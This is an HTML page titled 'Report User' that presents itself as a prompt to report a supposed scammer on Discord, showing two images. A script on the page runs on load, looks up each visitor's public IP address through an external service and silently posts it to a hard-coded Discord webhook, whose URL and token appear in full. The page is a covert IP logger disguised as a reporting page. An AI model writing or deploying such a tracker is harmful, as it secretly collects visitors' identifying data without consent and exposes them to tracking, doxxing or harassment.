<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        /* Štýly pre stredné zarovnanie textu */
        .centered-text {
            text-align: center;
            font-size: 24px;
            margin-top: 50px; /* Medzera hore */
            background-color: #f0f0f0; /* Farba pozadia */
            padding: 20px; /* Odsadenie vnútri kontajnera */
        }

        /* Štýly pre obrázky */
        .image-container {
            display: flex;
            justify-content: center;
            margin-top: 20px; /* Medzera medzi textom a obrázkami */
        }

        .image {
            width: 400px; /* Šírka obrázku */
            margin: 0 20px; /* Medzera medzi obrázkami */
            border: 4px solid #ffffff; /* Biela ohraničenie okolo obrázku */
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3); /* Tien okolo obrázku */
        }
    </style>
    <title>Report User</title>
</head>
<body>
    <!-- Veľký nápis v strede -->
    <div class="centered-text">
        <p>Report him now on Discord</p>
    </div>

    <!-- Kontajnery pre obrázky -->
    <div class="image-container">
        <!-- Obrázok 1 -->
        <img class="image" src="scammer1.jpg" alt="scammer1">
        <!-- Obrázok 2 -->
        <img class="image" src="scammer2.jpg" alt="scammer2">
    </div>

    <!-- JavaScript kód pro zaslání IP adresy na Discord webhook -->
    <script>
        // Funkce pro získání IP adresy klienta
        function getIPAddress() {
            fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const ipAddress = data.ip;
                sendToDiscordWebhook(ipAddress);
            })
            .catch(error => console.error('Error fetching IP address:', error));
        }

        // Funkce pro odeslání IP adresy na Discord webhook
        function sendToDiscordWebhook(ipAddress) {
            const webhookUrl = 'https://discord.com/api/webhooks/1079027251594674246/WScmj6RgY13LiJlVbomDFvu-g1pKltczQw8FxCGO-y0yVHB0lz2VWzfABQs34383Asl_'; // Nahraďte za skutečný webhook URL
            const data = {
                content: `web Bricky IP address: ${ipAddress}`
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => {
                if (response.ok) {
                    console.log('IP address sent to Discord webhook successfully.');
                } else {
                    console.error('Failed to send IP address to Discord webhook.');
                }
            })
            .catch(error => console.error('Error sending IP address to Discord webhook:', error));
        }

        // Zavolání funkce pro získání IP adresy při načtení stránky
        getIPAddress();
    </script>
</body>
</html>
